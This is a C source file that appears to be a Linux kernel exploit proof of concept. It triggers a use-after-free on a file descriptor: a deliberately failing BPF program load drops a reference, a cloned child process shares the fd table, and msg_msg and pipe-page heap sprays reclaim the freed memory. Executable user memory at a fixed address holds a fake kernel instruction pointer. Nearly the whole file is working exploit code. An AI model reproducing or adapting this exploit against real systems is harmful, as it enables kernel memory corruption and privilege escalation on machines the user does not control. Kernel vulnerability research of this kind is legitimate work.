#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <linux/bpf.h>
#include "libexp.h"
#include "libpagespray.c"
#define USER_ADDR 0x20000
#define CRASH_IP 0xffffffffdeadbeef

int uaf_fd;
volatile int exit_flag = 0;
char payload[256];
int cpu_id = 0;

struct msg_spray_t *spray_list[1000];
int spray_cnt = 0;

int subproc_func(void *p) {
	prctl(PR_SET_PDEATHSIG, SIGKILL);
	sleep(100000);
}

void dec_refcount(void)
{
	struct bpf_insn insns[2] = {
		{
			.code = BPF_LD | BPF_IMM | BPF_DW,
			.src_reg = BPF_PSEUDO_MAP_FD,
			.imm = uaf_fd
		},
		{}
	};

	union bpf_attr attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = 2,
		.insns = (__aligned_u64) insns,
		.license = (__aligned_u64)""
	};
	if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)
		errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
	if (errno != EINVAL)
		err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");

	puts("[+] bpf prog load done");
}

void context_setup(void)
{
	// close all fd so that when the subprocess exits, only the uaf_fd will be closed
	//for(int i=0; i<1000; i++) {
	//	close(i);
	//}

	struct msg_spray_t *warmup = msg_spray(NULL, 0x100 - 0x30, 0x1000);
	msg_spray_clean(warmup);

	prep();

	spray_list[spray_cnt++] = msg_spray(NULL, 0x100 - 0x30, 0x1000);
	
	/* step 1: open writable UAF fd*/
	uaf_fd = open("/dev/null", O_WRONLY | O_CLOEXEC);
	if(uaf_fd < 0) err(1, "unable to open UAF fd");

	spray_list[spray_cnt++] = msg_spray(NULL, 0x100 - 0x30, 0x1000);

	/* refcount is now 1 */

	/* step 2: create a subprocess that shares the fd table */
	char *child_stack = malloc(8000);
	int child = clone(subproc_func, child_stack + 8000, CLONE_FILES | CLONE_VM | SIGCHLD, NULL);
	if (child == -1)
		err(1, "clone");
	/* refcount is now 2 */
}

void payload_setup(void)
{
	long *ptr = (long *)(payload+24);
	memset(payload, 0x4, sizeof(payload));
	ptr[2] = USER_ADDR;
	void *ret = mmap((void *)USER_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
	if(ret != (void *)USER_ADDR) error_out("fail to mmap");
	ptr = (long *)(USER_ADDR + 0x8);
	*ptr = CRASH_IP;
	ptr = (long *)(USER_ADDR + 0x70);
	*ptr = CRASH_IP;
	puts("payload_setup()");
}

void trigger(void)
{
	/* step 3: use BPF to remove one reference */
	dec_refcount();

	/* step 4: kill the subprocess to remove one more reference */
	exit_flag = 1;
}

// perfrom exploit once
void exploit(void) {
	set_cpu(cpu_id);

	payload_setup();
	puts("[+] payload set up done");

	char take_page_back_buffer[0x1000];  
    for (int i=0; i<0x1000/sizeof(payload); i++) {
    	memcpy(&take_page_back_buffer[i * sizeof(payload)], payload, sizeof(payload));
    }

	context_setup();

	for (int i = 0; i < spray_cnt; i++) {
		msg_spray_clean(spray_list[i]);
	}
	
	trigger();
	puts("[+] trigger done");
	usleep(10000);// wait for the free to happen

	int ret;
	for (int i = 0x0 ; i < PIPE_PAGE_NUM; i++) {
		ret = write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
		//printf("ret: %#lx\n",ret);
	}

	//printf("[+] key spray size: %ld\n",sizeof(payload));
	//getchar();
	//add_key_spray_num(payload, sizeof(payload), 0x400);
	//lseek(uaf_fd, 0, SEEK_SET);
	close(uaf_fd);
}

int get_cpu_id(int argc, char **argv)
{
	if(argc < 2) return 0;
	int run_time = atoi(argv[1]);
	return run_time % cpu_num;
}

int main(int argc, char **argv) {
	cpu_id = get_cpu_id(argc, argv);

	puts("run once");
	
	exploit();
	puts("exploit done");
	/*
	while(1) {
		usleep(10);
		if(!clean_fork()) {
			exploit();
			exit(0);
		}
		wait(NULL);
	}
	*/
}
